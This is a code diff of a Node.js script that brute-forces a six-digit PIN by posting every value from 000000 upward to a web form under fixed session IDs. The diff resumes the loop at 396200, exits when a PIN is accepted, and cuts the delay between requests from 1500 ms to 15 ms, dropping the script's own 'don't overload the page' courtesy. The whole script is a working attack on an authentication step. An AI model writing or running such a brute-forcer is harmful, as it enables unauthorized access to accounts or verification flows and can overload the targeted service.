@@ -1,6 +1,6 @@
 const rp = require('request-promise')
 
-let responseId = 'NUtEMUNSNjA3NzMx'
+let responseId = 'NTA2SU9CNjA3NzMx'
 let sessionId = 'MlVNMkw1NjA3NzMx'
 
 let options = {
@@ -32,7 +32,7 @@ let options = {
 const timeout = ms => new Promise((resolve, reject) => setTimeout(resolve, ms))
 
 async function main () {
-  for (let pin = 0; pin < 999999; pin++) {
+  for (let pin = 396200; pin < 999999; pin++) {
     const pinFormatted = pin.toString().padStart(6, '0')
     options.form.pin = pinFormatted
     await rp(options)
@@ -44,6 +44,7 @@ async function main () {
         if (response.body.search('Alternate PIN Verification') === -1) {
           console.log('Pin found!')
           console.log(pinFormatted)
+		  process.exit(1)
         } else {
           console.log('Pin not found!')
         }
@@ -60,7 +61,7 @@ async function main () {
       })
 
     // A bit of timeout so we don't overload the page.
-    await timeout(1500)
+    await timeout(15)
   }
 }
 
